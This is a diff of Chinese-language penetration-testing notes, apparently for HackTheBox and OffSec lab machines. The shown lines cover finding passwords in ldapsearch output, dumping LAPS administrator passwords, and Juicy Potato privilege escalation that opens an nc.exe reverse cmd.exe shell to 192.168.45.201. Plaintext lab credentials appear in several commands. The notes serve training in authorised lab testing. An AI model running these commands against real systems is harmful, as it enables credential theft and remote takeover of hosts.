@@ -104,7 +104,7 @@ tag fetch 2:5 BODY[HEADER] BODY[1]
 2. 利用ldapsearch寻找特定用户`ldapsearch -x -H ldap://ip -D 'name@dc.htb' -w 'password' -b "dc=active,dc=htb"`
 `ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"  #类似的`
 
-3. `cat ldap.txt|grep Pwd`大概有密码
+3. `cat ldap.txt|grep Pass`大概有密码
 
 3. ldap输出需要注意的内容
 ```bash
@@ -684,3 +684,5 @@ Juicy.Potato.x86.exe  -t  * -p nc.exe -a "192.168.45.201 9998 -e c:\windows\syst
 Juicy.Potato.x86.exe -l 4444 -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}#然后获取到对应的值再运行这个，记得替换-c后面的参数
 nc -lvp 9998 #本地开启监听
 ```
+
+33. `python3 laps.py -u fmcsorley -p "CrabSharkJellyfish192" -d hutch.offsec`用ldap可能会有administrator的密码，位置在`/windowstool/LAPSDumper`
